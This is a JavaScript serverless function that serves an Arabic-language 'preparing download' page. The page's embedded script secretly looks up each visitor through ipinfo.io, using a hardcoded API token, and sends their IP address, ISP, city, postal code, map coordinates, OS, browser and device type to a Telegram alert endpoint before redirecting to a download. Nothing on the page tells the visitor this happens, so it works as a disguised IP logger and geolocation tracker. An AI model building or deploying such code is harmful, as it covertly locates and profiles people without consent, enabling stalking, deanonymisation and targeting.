export async function handler(event) {
    const downloadToken = Math.random().toString(36).slice(2, 18);
    const userAgent = event.headers['user-agent'] || '';
    const time = new Date().toISOString();
  
    const getOS = (ua) => {
      const osList = [
        [/windows nt 11/i, "Windows 11"],
        [/windows nt 10/i, "Windows 10"],
        [/windows nt 6.3/i, "Windows 8.1"],
        [/windows nt 6.2/i, "Windows 8"],
        [/windows nt 6.1/i, "Windows 7"],
        [/mac os/i, "Mac OS X"],
        [/linux/i, "Linux"],
        [/android/i, "Android"],
        [/iphone/i, "iPhone"]
      ];
      return osList.find(([r]) => r.test(ua))?.[1] || "Unknown OS";
    };
  
    const getBrowser = (ua) => {
      const browsers = [
        [/edg/i, "Edge"],
        [/chrome/i, "Chrome"],
        [/firefox/i, "Firefox"],
        [/safari/i, "Safari"],
        [/opr/i, "Opera"],
        [/msie/i, "Internet Explorer"],
        [/trident/i, "Internet Explorer"]
      ];
      return browsers.find(([r]) => r.test(ua))?.[1] || "Unknown Browser";
    };
  
    const os = getOS(userAgent);
    const browser = getBrowser(userAgent);
  
    const html = `
  <!DOCTYPE html>
  <html lang="en">
  <head>
    <meta charset="UTF-8">
    <meta http-equiv="refresh" content="4;url=api/dw?token=${downloadToken}">
    <title>جارٍ تجهيز التحميل...</title>
  </head>
  <body>
    <p>جارٍ التحميل...</p>
    <script>
      const os = ${JSON.stringify(os)};
      const browser = ${JSON.stringify(browser)};
      const time = ${JSON.stringify(time)};
      const token = "da5fb9d5d66daf"; // ← حط توكن ipinfo هنا
  
      fetch("https://ipinfo.io/json?token=" + token)
        .then(res => res.json())
        .then(data => {
          const as = data.org?.match(/AS\\d+/)?.[0] || '';
          const loc = data.loc || '';
          const maps = loc ? \`https://www.google.com/maps?q=\${loc}\` : '';
          const device = /Android|iPhone|iPad|iPod/i.test(navigator.userAgent) ? "Mobile" : "Desktop";
  
          const params = new URLSearchParams({
            ip: data.ip || '',
            os: os,
            browser: browser,
            device: device,
            city: data.city || '',
            region: data.region || '',
            country: data.country || '',
            zip: data.postal || '',
            timezone: data.timezone || '',
            isp: data.org || '',
            org: data.org || '',
            as: as,
            maps: maps,
            time: time
          });
  
          fetch("https://telegram-alert.vercel.app/api/telegram?" + params.toString())
            .catch(err => console.error("Telegram Error", err));
        })
        .catch(err => console.error("IPINFO Error", err));
    </script>
  </body>
  </html>`;
  
    return {
      statusCode: 200,
      headers: { "Content-Type": "text/html" },
      body: html
    };
  }
  